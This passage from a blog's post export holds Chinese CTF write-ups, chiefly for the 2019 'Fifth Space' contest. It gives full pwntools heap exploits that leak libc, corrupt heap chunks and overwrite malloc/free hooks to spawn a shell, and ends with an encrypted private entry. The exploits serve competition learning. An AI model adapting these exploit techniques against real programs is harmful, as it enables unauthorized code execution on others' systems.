p.sendline(str(note_size)) p.recvuntil('note :') p.send(note) p.recvuntil('offset :') p.sendline('0')def new_M(data_size,data,note_size,note,shell_size,shell): p.recvuntil(' 0day\n') p.sendline('1') p.recvuntil('bug\n') p.sendline('2') p.recvuntil('size :') p.sendline(str(data_size)) p.recvuntil('data :') p.send(data) p.recvuntil('size :') p.sendline(str(note_size)) p.recvuntil('note :') p.send(note) p.recvuntil('size :') p.sendline(str(shell_size)) p.recvuntil('shellcode :') p.send(shell)def new_Lo(data_size,data,note_size,note): p.recvuntil(' 0day\n') p.sendline('1') p.recvuntil('bug\n') p.sendline('3') p.recvuntil('size :') p.sendline(str(data_size)) p.recvuntil('data :') p.send(data) p.recvuntil('size :') p.sendline(str(note_size)) p.recvuntil('note :') p.send(note)def handle(my_type,num): p.recvuntil(' 0day\n') p.sendline('4') p.recvuntil('3. Logic\n') if my_type == 'L': p.sendline('1') if my_type == 'M': p.sendline('2') if my_type == 'Lo': p.sendline('3') p.recvuntil('handle in?') p.sendline(str(num))def show(my_type): p.recvuntil(' 0day\n') p.sendline('2') p.recvuntil('Logic\n') if my_type == 'L': p.sendline('1') if my_type == 'M': p.sendline('2')new_M(0x60,'a'*8,0x60,'b'*8,0x80,'c'*8)for i in range(8): handle('M',0)show('M')p.recvuntil('shellcode :')libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f208aea0ca0-0x7f208aab5000)log.success('libcbase = '+hex(libcbase))one_gadget = [0x4f2c5,0x4f322,0x10a38c]new_Lo(0x60,p64(libcbase+libc.sym['__malloc_hook']-0x23),0x68,'d'*8)payload = '\x00'*(0x13-0x8)+p64(libcbase+one_gadget[0])+p64(libcbase+libc.sym['realloc']+2)p.recvuntil(' 0day\n')p.sendline('1')p.recvuntil('bug\n')p.sendline('2')p.recvuntil('size :')p.sendline(str(0x60))p.recvuntil('data :')p.send('\x00'*0x60)p.recvuntil('size :')p.sendline(str(0x60))p.recvuntil('note :')p.send(payload)p.recvuntil('size :')p.sendline(str(0x10))if attach == 1: gdb.attach(p)p.interactive()]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>ByteCTF</tag>
        <tag>OGeek</tag>
        <tag>SuCTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019”第五空间“网络安全大赛]]></title>
    <url>%2F2019%2F08%2F28%2F2019%E2%80%9D%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E2%80%9C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[唉。。这个比赛。。。一言难尽。。。只有pwn和web，15个pwn，5个web。。。开始时满心欢喜，觉得很刺激。。。但后来发现题目出现各种问题：原题，Libc发的版本和远程服务器的不一样，高分题比低分题简单。。。 一共出了12个pwn。我看了四个，出了两个。。。也算有一点输出吧，有一题看了一下午。。。我jio得我没出的那两题还是出的不错的。。。有必要记录一下hhh 题目自取：谷歌硬盘 pwn8：开始以为是个菜单题。。后来发现只能show一次，而且只能看两个字节，edit三次，觉得事情并不简单。。。看了蛮久的，还是不会。。。后来看了blessing大佬的exp，如同醍醐灌顶，这题算是我之前在小心得2里提过的那一种最难找的漏洞。还是自己看为好hhhh。exp短小精悍。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#coding:utf-8from pwn import *path = './pwn10'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p=remote('111.33.164.6', 50010)def add(size,content): p.recvuntil("choice :") p.sendline('1') p.recvuntil('size :') p.sendline(str(size)) p.recvuntil('content') p.send(content)def delete(idx): p.recvuntil("choice : \n") p.sendline('4') p.recvuntil('index : \n') p.sendline(str(idx))def view(idx): p.recvuntil("choice : \n") p.sendline('2') p.recvuntil('index : \n') p.sendline(str(idx))def upgrade(idx,size,content): p.recvuntil("choice :") p.sendline('3') p.recvuntil('index :') p.sendline(str(idx)) p.recvuntil('size :') p.sendline(str(size)) p.recvuntil('content') p.send(content)P = ELF('./pwn10')p.recvuntil("choice :")p.sendline('1')p.recvuntil('size :')p.sendline(str(0))p.recvuntil("choice :")p.sendline('3')p.recvuntil('index :')p.sendline(str(0))p.recvuntil('size :')p.sendline(str(0))delete(0)p.recvuntil("choice :")p.sendline('1')p.recvuntil('size :')p.sendline(str(0))p.recvuntil("choice : \n")p.sendline('3')p.recvuntil('size : \n')p.sendline(str(8))p.recvuntil('content\n')p.send(p64(P.got['a64l']))view(0)lb1 = u16(p.recv(2))log.success('lb1 = '+hex(lb1))key = str(hex(lb1))key = key[2]payload = key+'390'payload = int(payload,16)p.recvuntil("choice : \n")p.sendline('3')p.recvuntil('index : \n')p.sendline('0')p.recvuntil('size : \n')p.sendline(str(2))p.recvuntil('content\n')p.send(p64(payload))p.recvuntil("choice :")p.sendline("/bin/sh\x00")p.interactive() pwn12：这题没出的原因是感觉其他因素太多，is_root我都不知道是干啥的。。。还有什么各种p1，p2，p3，canary的检查，一直迷在其中。。。想用unlink将is_root变为非零，并且觉得突破了size的限制，使size能上三位数才能用chunkoverlapping。。。忘了可以合并产生大chunk了。。。其实我觉得还是对unlink的条件不是很清楚，又理了一下： uaf，可以控制prev_size位加off-by-null，溢出，堆块重叠。。都可以用，其实本质还是溢出。。 思路就是先用off-by-null构造堆块重叠，然后unlink，将free_hook写为system。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#coding:utf-8from pwn import *def add(p, size): p.sendlineafter('Exit\n', str(1)) p.sendlineafter('?\n', str(size))def edit(p, idx, content): p.sendlineafter('Exit\n', str(2)) p.sendlineafter('?\n', str(idx)) p.sendafter(':\n', content) def show(p, idx): p.sendlineafter('Exit\n', str(3)) p.sendlineafter('?\n', str(idx))def delete(p, idx): p.sendlineafter('Exit\n', str(4)) p.sendlineafter('?\n', str(idx))def pwn(): #context.log_level = 'debug' #context.terminal = ['tmux', 'split', '-h'] context.terminal = ['terminator','-x','sh','-c'] elf = ELF('./pwn12') DEBUG = 1 if DEBUG == 1: p = process('./pwn12') #gdb.attach(p) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: p = remote('111.33.164.6', 50012) libc = ELF('./libc-2.19.so') #gdb.attach(p) p.recvuntil('what\'s your name?\n') p.sendline('sunichi') p.recvuntil('what\'s your info?\n') p.sendline('sunichi') add(p, 120) #0 add(p, 120) #1 delete(p, 0) add(p, 120) #0 show(p, 0) recv = p.recv(6) + '\x00\x00' libc.address = u64(recv) - 0x10 - libc.symbols['__malloc_hook'] - 88 log.success('libcbase = '+hex(libc.address)) delete(p, 1) delete(p, 0) add(p, 120) #0 add(p, 120) #1 add(p, 120) #2 add(p, 120) #3 add(p, 120) #4 add(p, 120) #5 add(p, 120) #6 add(p, 120) #7 delete(p, 3) delete(p, 4) delete(p, 5) payload = '\x00' * 120 edit(p, 2, payload) add(p, 120) #3 add(p, 120) #4 delete(p, 3) delete(p, 6) add(p, 120) #3 add(p, 120) #5 add(p, 120) #6 add(p, 120) #8 # 4 == 5 delete(p, 1) delete(p, 4) delete(p, 6) show(p, 5) recv = p.recvuntil('\n', drop=True) heap_addr = u64(recv.ljust(8, '\x00')) - 0x80 log.success('heap_addr = '+hex(heap_addr)) add(p, 120) #1 add(p, 120) #4 add(p, 120) #6 add(p, 120) #9 # 4 == 5 delete(p, 3) delete(p, 4) delete(p, 6) add(p, 120-0x10) add(p, 0x40) add(p, 0x30) payload = p64(0) + p64(0x41) + p64(0x602320 - 0x18) + p64(0x602320 - 0x10) edit(p, 4, payload) delete(p, 8) payload = p64(0x602320 - 0x18) + p64(0x602320 - 0x10) + p64(0) * 4 + p64(0x40) * 2 edit(p, 5, payload) delete(p, 6) edit(p, 0, '/bin/sh\x00') payload = p64(0x0000007800000001) + p64(libc.symbols['__free_hook']) + p64(0x0000007800000000) edit(p, 4, payload) payload = p64(libc.symbols['system']) edit(p, 3, payload) delete(p, 0) print hex(heap_addr) print hex(libc.address) p.interactive() p.close()if __name__ == '__main__': pwn() chunk overlapping的两种方法： 当时忘了第一种，迷在了第二种里。。。。。。。。。orz]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[杂物2]]></title>
    <url>%2F2019%2F08%2F18%2F%E6%9D%82%E7%89%A92%2F</url>
    <content type="text"><![CDATA[私人空间，谢绝访问 b7f8e1a255942a2e35d4590439db7bcc19e93e60c1b6b0a2584d3e0aa3f8d4cde2bab30998ebdda4be2e94593c9870b1dc364df0597a67ef024690236571268845c9dc0a1f5ade175bc00326461e9b325165e7384c90843ce61c2a7c6881caaafeb02fdac2e8e4aab9d112dd468fc0bea75119f05d1d36279454f8e64b1574fc3f4a06434627661a6cda16bf79104a25400b60c75e0c7b1d646fdabb7096ac0b0e50a09023ac36a3f56ccd8a6fe1e8cb8b6a3b30160e1e901cdffd2c3caaa5d047f7d8590db28dcb0b7a1267dc0835320ceb8ffe7eaf0cde820b26dc083711201bbc5aa8699ca5fc50dfd74e6719e8e2f9d891b26a24220febfec0ebe22fbd344093ea9e4b31de2f4895aaa7bacee7f0c89ee2bca2fa20e9d612a5eebc6417c4ef4bb8ace418164bdbe584ca694f4c483ff1d206838195f3eac5b10702331f451091f0395eb211282e97e282d890d6c454a9fd9bbec82676becfd50a456aacc1c5000731fb46ba3f109bf2980809116e0424bd661227913ec8406da8ab9be92dfabd7b0c514a7e61b6e42b9d101c5ef52110d76ede484eb26b53a1f066c229e53699112bc94ba0ce521434fb421b6f396f773d96e8194c64d15100f93b26aef14d63e387b0e0fca6c63e96da320f6bf3cad14da1b4b7d9325c608503b5ab693cd03bd19c80f95eb9e0a571f57557d1553a975b3371093614b738cfeed1c937faa06ff7b1398b2f9ee9887595c0e0d309761f7b9b8c2294491ec07627bcc73de30e18b3e6b5b37b00ee9de51d6fb1c17f1f7ef325feeb96c0eadff7eb9cda7157318e5481adc1d76e1c4cf7c9ed58ebe1a8bf29353ddfbd7b6d579dcb0d21c8990b25a56d7fc4814e161e736a8fc2b8bd78c287a57202b2a2ba2dc490d7062d80c16037eb4ed9cf2e9be202cd9b65eceda6b6669524b64633715b8a4f7d503ec20740e4d52a2d18f3f3f805aae989d425a7a5aa578cc7f8228fd3240e89dea35b9b986c19958c7ce49a0e0106a852e1c13b379e715645165155c5720fe8a54d171f209e6f4c05802788e7ee0f8567b17e272d26c7ae175d62c580b81e13464f92184f4bb1a2ea3b1a568bb7ce436756af52fc0678b2cd1870b34124820fa1688ebc8750afa80f580e80d606d17bdc6cd1a51d3ec2b4970e4ced6f8976bebd4ff57864cf0679b6b16913caa8636596770c507abe5c6d69a48969a0622e43b584177ac5d03757e2e02e8a8ddae1e20aba90031b697e65828b4b07cca1025da9965a6123e373d8ef4d1b7df769f8dc0fa41b77d4faacbd16850aac341f5f2cd6dbcf469a12a1f376c85fbca619ed810fdd164c77997fa305d1cdd635c820159536db2122c6f2fd44f58e31da6e7a3c3ade743734ad88184afdbc6de5bd73621603cf23615c3f2ea24426b5a90c4c92e3c4bce957cd79925861af6e6e4e51df56947bdb38965660f0ff3019ca94c4badf455d776a3ffb796b5550e414d7042ecd2d93dff61a71f3747e809cf93f11b3fcb33ae436972b7f3b27c90861f39965fa6fbac8f3e103b54f68dfe80ef597a3e2d94259ba26d94ae21dc5a30108a87f88e91ececcd471be6b083baf1253e892680c3c9bf2bbe45fce54e0a9d7eda32e2221ba424eb6db8671e0352b9cc164039d9a05fc28c989edd95bf03fab8c3193e762b537aa8f55b36738b7ba7a920206c8bd24ee249badeac5a3ff3a6dfac401d6cc58c87d5ebe5544a1273b037baf34ebc0d732ce9d5f424aac908b2cfb769d965e86edae2d32eb5fb22d06ae6e35565c8e5a78fccb91861660508270c2c1c2e694c4740a8536c0699fa1e8919833e71045d25589f7866ed22eb73547190071dc7204c6abab4f158ece2a506db608159795e24e1ac4bbba8fe1e6b7194045cae11632ace96039e15631db145d287bddf2968ce4f8705d71804f899a1017ad3560abd31dfffb0f7224ea9d865c76080804660965e3a104f0ef24f3dfc92d5ef9bf18653c8b3a333c5e8c435fefc594c01714c7197199de93126819498f26ae998ca2fcff838868b99b39482fba7bb5acdd0725c9e9a3477d38fbfe5de240f97eeaf862aaa93a737804bf0efb69df0175fb4f8dd4d7a899d684899809d35fd853104df588d69f1bb53a096e94c7cf35ca568f53bcbbf32a9da9d637ce2a4171e970597af1c31eda1388086298ab7be2fa0d06628ed3924a6ebacb5ac4cea28a68d9a9e29edc828ed12479cbe34ddf75af41332ca65f22821bd0231d7c6d915f408182ed230172cfbe1b77e854d92d34cfa7db520f8816e6a2e66da79d09dd358d6a229db7aa5024a6b5d3c508a6e62b7ec2ae44df6917774df6288182ee76205f5508b6e73adb19b29766e3e07d87b8d4518fccc838342e072a87cec6e399d2f22b5ee49752b77bb1c43740ac3f15edee115b9d69a0cc51e2291e2e18e7d1f750cabaa43e820730242b0868cd2e8ca69afa7f02e9429f96e78e51c0f9964e2a6b09229fdf48e7517f2936bbd8232bff6e0479438ec2c26abf39eb504527a4d1ec469d81c05c9855692ded12c49000b3783c63315a53322a9351fae777e6de8dd7cc0023a11e731b1dc030c26b312412550e0ded1c17ff6e02b9a7239ce65670fe1e4560bc64a03e4d517670e284ea3fe3dbf3e8122b34949708b793068b3938adb255b1d107b9a34b2f7d184e5546f330d78c891939401474bf46359a2c2dff12f7f29da2b9f008b68261b155e6c7061f0b8eb45d225372f3f5b45824a8a62cd06b86f023b84bb2782bea04f2452f187c5feeca68377f3d5847ae0f76d0a2202ec6c3d93707483848407740d99ef05079f520422ed7b62455f2add104ac4cf0dba2db54ead1240c2da027325fdd58b5fa2ffcbabba47ad24341b37a150a40bb1cf69e67c9b472cf75be51ec7750cbd1dae65edbba05aae3b0cff32f640c9fe3af04d6b34f6c002bc66109a27bb95d14e96a787709d2407cce03820738865a4aa5c2088a344bee547df0bdf4a3f343744b30ee4b750c62c53f80631cfa10b097431d921dea3be0117d6ce47aa1715f69fccf27cf4cfde6e6c90a446bf04689eb6c45fbce163fa95c8d0e78ece774e2ef5ef683a01b1cfb6945c6cbc7916ac861bdf9795eef3201b89b38b6212598cb26501ec56d320ee45303958210472e8a2c9a8de8eaa2f161a1f723d4b3c5c499e69457055f541dc77de5b934851f7e49639fa1905b8ff4e16dfbf96bd3018d7f5732d973dfb6699757185771641a5af101b40d279173441edf5e58e882a25e3d0e6dcf1acb25f4ab366768e63bd6ecd56bd3b9835eb5da1269c32ad03bb8e3ccddd7f7644b8ebc0843aa69f3d5639c69832d84156293dee412ff0b3c55409e46ae5b279b41f66517b8662375cd411ed84a8d96c340efae2520e14c18b3e6b4aa33a77fae0bd459a48d71ee45d051c5ac240fa94720874b64cc8559cf619a784e885b8cbd18e60fb960631db5930a278dab994a2b0b195874b62d739c10aa263124b6d3dff4b4ace65f7fb59fb0a51f126af89d893e6893bb619429b7893a4039619abc7106f41da3ae2694c2f7c704529b92760b9da4c8a757a3d5aaa5f54f7ca470ad9f579e68b7470f7035f810779c5468228205e36e75cd211f61fb10117ea03631bd54509950244874d636e4b48ab59e7f18a4b26b08f148971fdcea92796abe4666f583b24098fb2e067d94bf16dc364eedaa90ed5132334c1a6464a3d0fb8a92e6280fc987a89d31f50e2d73721f05bb1ccfc03c72e2d9b53228038c2889174bcc272a505e908d7f1ffe991db6340187865fcd4fc1910cc710772467fa84dcb91a8c167465e3028f57473380f138ac3058e935a84ee10b90dc8771a2f7bce59d83fa983580dfd164401a5e1e451635f3a7cf8988f8108022f7c0687e772fe5966a29da88ef43171c7899accc5f838eeeb1b97891fc47c57c46e8913577400a85f452ca50b2839601c2472613f2f3e48dedc6d77a1005d034e876544338deb3c489b2640ebf147bc6919b98c80c7b44241497f4f7cf93ad237a7482bc7ec4447c59939ca54b258a6b6baf1b25006352500d7c16f0d33aa6bccbaeaa556197a23a2c5edb105ec51b5f8c012dc3e2787b2292a5bb4a5ec5da4d9618b69d889fa302f08172beda970f6e2e16ad48c6631b6359625e689f49895b3633ad8098049e4c96f06c90ef916da0f0a8df63a2c958c9f0984909911174c5ddc63482a39b4bc07a163c0ec6196d9993873331eab6f58e286be343e88dbfc6ccda05ee78aaf4b03b76bc1ac4c04dc843fe3572857567d42429c83e647de0aaa3e43269b5f3b49d010ce109bd0d146d733169ae93458c651504b5f9ccf440534e43fe1447bb9eba90a178a0a25b4fab5853c7e69db1d3c7044f4f63137d3a1eb1915fcc035671d9680cad01117a73b1b16f541598a2d11d99b6673ccba85ddc2213597fdba650a07e9918249b1bdc8abcf1a6c151ebd61ef3ca780e6f28fab2017a49101159226ba79d3fd0f72316dcf7a8f8aadf52e8d005f868d1a4869805154f8f79882bc417d31d17c32bfaa8208c39c9bc9ec1ca79b20614175b45180a05e775681ca97abc2153b4097d92885bfc014eade8ab523009478103125cd80f52bc0a8aca961fcf7fe2e8fb697fe23cf3fcf1643715d89a3babc7e1e9527e78307d4f720b6a0050f30cb611a7f81de4ac671fe57065c10cce29f0ad4b1d3fb301ccb4f7123f3aeba7f7d7290fd6c0cdc397858d9e33d305a949cf89448a01a35ca19bc76783475c1984685adabf230d33a613191b312742c54c57b7e67be98aecb829130cabec012b378b0e7080475860a6bee04d1e1b97f72246b3f45535bc49debff2def4f1c2d3a37f7ea9a21e537b4f239578749f5d3711d1eec87c84f403e220accc55150c94e40bca390e24c52c323b430032c11ffaebeff72794b450320361cfc7c32c31ed091ec1cf9fcc87d5250b3ac5bb4f5780a15950610eca65049d434c9db90f1a510f26a91280c6a7fab6b1bc61b27079bfb57c6268c21e4e169953e32d4b2ee14c8c86a9712eee504d2bae51ea7c0784b483d8556602fc4acee79a9b13b44f500d5ce979261812e84c6138d74ced7646c7ed7a0c192a8d4dfba0daba158457631e0c1e8624fd411708eb2005a4d3becf93478fe77a4cd2e156c5a49b041b7435bdebe68d1de5982ad14a7e8a38d584dc98910fc9c82bc097bdd09ab8b152bc2e7200a98ff8873d14fb5a530b47c52068a69ebdd500dfe166cc61fc2e02b944f0edff60c37a8e751160eaf6b987ead89612ae8d299c2ab81673f022c71a9684ebb4561bcf16d4c20b02982e6fb603b38247cf94c291f48455ead120eaa807780ad5449ccad5932ff79c503f6810bf0085635b5010759ef77baed32bfb64ba7b931cfaf0a771e49549a2800a760db824682b1d0360cfc37b1b346479eaa85fb60dbb020e2b1a102f8c654239a15c4e402d6d4912aa65ae07f830b3fc6abaac8295616a6d4ce80ddb222185a5880e0aa9884eae6f772d36d468075465e2f2750b0baece2147165ae5c53a3996ab4b869712bcbf099b17e253074a7ce2594f14ebab8ec9bf2d3997619feb29ef675470d484ba4f8a3a9e74dbb41cf4a8b4ab346f47470a404a841ac15029b76dc723224254eafba6c6a4ac537b207729a6f8122566de48ce5f88538cba75acc30c12d7c72c82bcf06843428c1786c5b72d7414a9f30365ce0a734c66a9f03efb97a687c92c93a395a157d49e20883056aee675a064e3a0f72f244c4fcedef06e99ae6c62b7ed4be9c7610607b7273a4038342ae0bb9d02f8bf90170c9c659bcbe755a089047479be7e4597dfa86a2827f675618e9079475454b5baa95e33ca3d8bd201eb89f8861e9b6d9a79984252b8f281ab8468399e565912736cc808ee8732ed2f2be1a83bfbef2888e473debada304292082586163a301aba844f73c2bc0bf954e248d8a300b91279775f68a093913544ddd4bd562018b8c61ec9662d1b33cde5541d7c850f6da70f9af4a69fc608ce0b95bc1c5fe5617c8c409d831a45a4c75efc392ae0b2dca9df9c9875bd9a8f94f784229535a9c22b282cf81f9051fb18965c5eb4d40a18ec75290467c7e3a763a8d33b8067df83ee811751ca9ed550521d457306585be18eff7774ea01bd30ef7ddbc613f9e1aa9ec3b82f6878cfaf820bd535be49c52dbb647ce62d58d02a8fffa4e4ccb98e27870448f07e4ce1bb4b9eb07669844ec70c7d7c028ed2e13699e8a7a8c074a7b9c19c1c9b561de404a72d40342576ef23e8c22730831e7467ac811df6e6228d4a894087bf00eb34affb5b984faac6c9c1a757077753179cabcaac26623e67f39f5ae6adff9d5186836f6c4d288f9e3e10d21bbfb4e4b985bd28c29d3a35b501d62d1e9ee39650792b29ecbb28ff0bb2ed8940c0746085c12e7b1643e2361c313944e7445b010697d96cfdb7753cfb3b830d6bbdb7a1dde2c4e74a17f341e2f2abf0f26faac854851009379e9f64dc8c23d90ea0740dd86a32275c373c63e2619eb0672328d0d2a36be0cb99a7ddb048627aa54044fd638eb747fd4442b907dab4b8042908fa59961d3d66a4ed7a217e3c1529f21a36a691e1e6bab52dc1b35e03678866a5a684243fbb62d4997e94dbd821f97e70ab19f11de67badda75797c3fc7b1428ae156bc3040f409fe7ff51f9b4117374e3e6ba1b3e1e26adf9f0a33228851a89418ffa06fdf1080bf91396754592748e125064c640a8bc8c50c7152318d51065dc3d81172532ebcdf82911b17f59058b92cb554def17afad0558df24b09cfa105d5a08dd283033d2917e0428d7fbcb0db674e465c0c802f0dc182d5db51f6757d8abfb74150edf848c88955e9166e672dea9755abf027ab47a93ef904267dc0e32256e94c5cc12cfb9fac4f743ad3d250124ea2cfd823e315f04c25777ce9ebb440171886b3f7de668bdaa4f234967346dfdd42c2a67801dda8abc924abff0bd85c6ab7ac02acee76336c716988f2a86de024e5028e9cc565fb677b367c690561d0ec33a88347948c506976705b9a3b68aba04e88aa7cf51b0954565b753e89185307ab75fa54026deec1e7ab197a5713cf16af1c31afcc2b6c2853319a319d238c8eb5e18b414ec59714b777b474a350aa003b85d65d6685748635044a564b5ff88b1e0f7b9c4bf6c401a2afc985aef1f85d4bea9a60d5c7a9525923836663436a9594d0e75482b4d46b5dd1f3b98fff38f03924838c1e09533157173104003c014e1b8dc6720326433a0e07c773189780bcf4e0794ccb24c83c05d1b1b3e3e6c422bf2e8e84b09966dd3a03874057a339c78aaeb065409264e315837a9cd8da97a170268745e105658ea979935ec7befa1be0cc22f4ca57a800315b66dfc6d4a1b66ce13b23c5be0d4c7733d88c3788991b5ac1a92c8b4aba8a37c559bcc462ee23238964ff203dceeb42cb20bbe41999ea273f97a1624813c788fdc917053be65ee3718c3c539e97a994e8b5cb352a52b917e60069c92dcaf9462e69b9f13f7bf5f64e9f9c219a29ae781b18732f1c063fb4d14dfe32f00ae91891e5a6fd6c2184141090716fab970461f9ef8c96c088bb8b93e78ca144224fc0520443c9db0371e769f519ea2d4c063bc2e3f0655ef8233c74010c07ad4d5f02c3c545c78c0c4cf93ae6b5a7ce65556b1b3fc3a41c9fa4b5f348a8a04b392fecd0128c2d6bbda166c8ee3cd7cf03f624ce4862f1c005039a23334e7f0f2018be651da011a49f7580752613297fa46a19842bc684285d07f1ba5ce537139ca1a2ade550e51fc6c745a314918182b227e5814b31e78b7c19b471d16199ca6040fc514a07680ba115fabe9d50ce6ecf469a689f9689a883910ba43ad71d8aac505b6f89a7f7c28e17cb400b65023e49fc04e4edc4565418424cb145cd75de593261d1cbd67e658d7e59e9ae002e184d44f5f5b14ef35e003dfa70f2f931edb2768ace3347c034176fc0840c4544908ffb13ac3bbec56672d898f324e01dba5d1477dfa144349dae4522106d0f73d5c97fcce3c2b470934914d0b8d4004844af3caba14902d9a23ef8d2946bf8381379064be4e843ea141efb8ca93ea87f9198801437fac6cd1bcc78485e95da64ffabfe3c83fee040366acc4a8aed9d4f40879c99f4af2d145bb2ef4a0b42f77f6ed11b4c8255bd90193a3c55f843c3cc59adc3b743eb9cc1927c130901687b9f94dd9a2e737a533c316f1d4a55e0f094f7193213a0baf45c80128c70831a3e977671dc148a830b40c72f2ac6c61640b6b9539bdb297373bee4b023b37330a3246f1ee2f3051efcbf534f84babcba2267e080302e1ab93aba84076d3e1da8c71824148980dfed5e0450058d1ea8ef3fa53a671520b6c32be795ad0fb63ba82a64c5eca706bd81265fa2f097e52793940c123a9a5f24ffa9cd02437b06436d4972172c6bfdcc2c707912acd66003715d9b793853c7ec0c5569f5405fa5b6d9b674377933e9b24ace23957459135a2198c3fff6ed2a2f1362a85a45d3f48662bdca48a1bbfed8cf0f98ae4424a43d0eb619f58bcf339f5f9730a1dbd6c5d34d409a71c422800a310784eb6078038882e5567ad8f95c07949e552dc4f309413281d80c30b062e61efe47f1428a28ec9558a143b58a7e353dc1eff7ecb3f27ec112ed689f7eb3211505bdd6b9c0f5873cc6cafc7a93024996d795a5b1eb9a94510a37ca76bb550b90efea2e49de6af8e98f4db62d53e4afdebc38c776bf74ef1b5451d80fb04ae1fc912fcd34ff47edc2684e48c0d31e5e82235b89e2469f7a03a19b6b73c25169e0ee79449f98e6a88103344229856ec070e42f3494e04c84c3ad6d49a61870cd3ff09cceb2b9bc640767fcc97fbb4982d9fde83628abb297f9db8029195296068cefbb89b76ef74fd5297009ea2f9339808357c7943679d99d4204e5ce96a10c941bf905e58d8da89a9dca520b5776095a298af8a39ef7b942498cf536297f71c896ece50638330453d17d442f94dd89d80428a54fcc5c79e65ac33975918905af91523d1db304cfe14ec994edcde797580eedecbf09aa1ea5e176edfd84a7ba94dcbd2c0b9aea71e81f70f4db84fe73671e5f01e76c758bff39dcffadbdb3c5c6a38e610dba61ea53826b8bed9656e5c4e3c6bf0c498218920cf5dd0f0723bfb46d2a2e5804ebf53edf764d2a12b5cdda485e5353db801100097016c9ecf328d99b814de115aaf950a0bbd7ba11469350e233c05d40150ca2e7ded56105e8b28afe403d92bb2f094f843c1261f58eace97f080e37cac5dbedf7b848ece1ac41a23f3340d3916a82569bff78b9fac935daea09ace1d46bc318d19bf59b946706b39eaf61f8ea80611c12e4759453b9cd2a690072b216b525cbff916f6ec42fddab95905e04030c927dbbf54606e22d7a6961f72b95fd9a2d0387f53c4afe44e0b9c5fd06585bf593518e645976f40979aeb4e3833e0c73664ba0f3851c9d6cce9bd32f6758744fdafcb0e2ac695f48f24bb895d1c78943a186a5c4dfedf687935975a4f0af8df5a31a99d4906f3f95418ac57c96c07ecfa6cf8acc4d8eacc2e598f56a5c7a2a1a35a5181ac5acfe60dc046bde56e455e6792000c3d4a88c9f477e035da4d64bbb0a985227429d43f5450eac0226ee4e32040ac1c376134897fd6129df668714e52c345757be7ec2e86e6cf3f7c4e7782cb99046087e97d97d409f297818ca64dff8d1464599f1e833cc0a1a3a872c6587bc1092ca774959abc18a1da082b10896faf7946c492c5dbe45f6f4a4f865d0eea542865feee905b31c27b7177d33b07faa9b599d496993972d734e1a7f79dc8f89454cf72292f4d8f016475b8de8047541032adbb8276e75cb6a941900f39f5c02a7458929cc7ad93df581d959fdce3ad00165b732ff1478b33dc1a13113d51f3ffdbfa1dca5c4506a702d34998114aaa05327b023c3537eb402c6f78567b648880e8d07639c667bc39b6dbb120fe20bad440e74ff440b610e1b673582da97d7f7874b474b4d8bde0ac2c75b10119034d178801112a8901161008014d54a79048f37e4563c555ec055bf73bba1ff7aaef2dcfd5681339d80b6eb82e7d414c820aee0e39c0b54fd30e077ec3153031f5bf9717c2a0e3c85a131bfd63c366e2f8795c3784cb6f26e08f588eeea8302a00e343194763ebbee7c4202f912842c2234c5718992dfcc70f4f49b730b2a7dadf42fd08637399e4fe19559ec50c77a9c0209c6ac6d6aa2e6a5ec4a08b98480073fcbf5785c14adfa40055187e4c29b476a966a9e08185c549cc4be1cb4e6117769e78d63cc640c6933158c53a36c18bc8ac51614c68081e7fd393b5bf9bff5e32946abde17f02ae0af8910612b1b4747cd030564e2629b7a859f6ce1559b971f371cf1ae418a2e9b85ae4c311311e7ad8ffee689689c6b4a3c744c958b4a9a1a6a2ae31f70ec3f93340bccebb182fa661a92e3280aff9d4fc81305679e97e40e2d824a765de486700fa1956584ffe95d78b59e2b18d8f9c7752b88aaaefe9e7b35205bb80f50070ca3c0e1dcfcb72bb81f5bbcf696f7ca765ea851daf41ce9f88d202b30ca066cb38dd734089dfd199efc7cf58dddae435e47a13cbc25038a0ca103812f5bdccd4a0d758845a68943a4f3718b5014eed684922b12912ef21826001a9e88ab266a2930161bc3abcbafb637f926847993a66c346a5cf1bf23038a8d93ee24d42190c96134db624448e2f831f1b7ba53872e8a1998c144ca25e0f8e60d20a428c6007e09b6a61e455ada51dc61ca372d1c1491f78b55d4d033448b40ca9fb6574bf828e019d85268cf985266aa823a1240a6e6e4615a86ff4a4b213ede9c28578df16ea1b8192dcaaf764b7208e9de644ba4c7fc7c4f75f266ae0962e39dcca55429057beeeda61213a441f7a938711ed6e60fb95e08f9b04c7bcf6a4bd644873a5ba05b234b3683268cdca4f26b3d8296bc37b45ca02c1a7b647a52cf8b1d4b1af373161515b4b94ec1ef23586255907e606d30b90e7913548ee118d02ef2597f066b04e98a40cc5859ca5e81ba6f8ca56cdb8c4b89013ce8a1e80acb7c7c1f4c7b93f9612f3a43707f1f8595d8f851354fff2cc9a1d857fda20b9efde76dc8695f0d9a19fc2b96cd3103880b37304815a0d8ecd43bc84e493bc18ecf341b9f84a6a71248a093e574828d4064ae985dc9b5591e88a47ede6d2144f47d7d68d6d047ea52b9e760c190aa24e03aa91ba6a472175c8affc7c03ecc67e7bc46b06dbe2e71637ae1b6ded14250aee1949de60005b1ef41a64cbc9f77fc8ea5d85475fe6a8b0a24e11e386cb0dbf33b5298122bf81f7e5a142fbecab678e2ae264a115d0eb81aba4b3a7e2a6351fd5d1d5da2b32e0491dbc7787492a5750d5fb27c8b50798fdfd940c408558de3558929ff737f22bb52c8a8cfb0c209fd69d1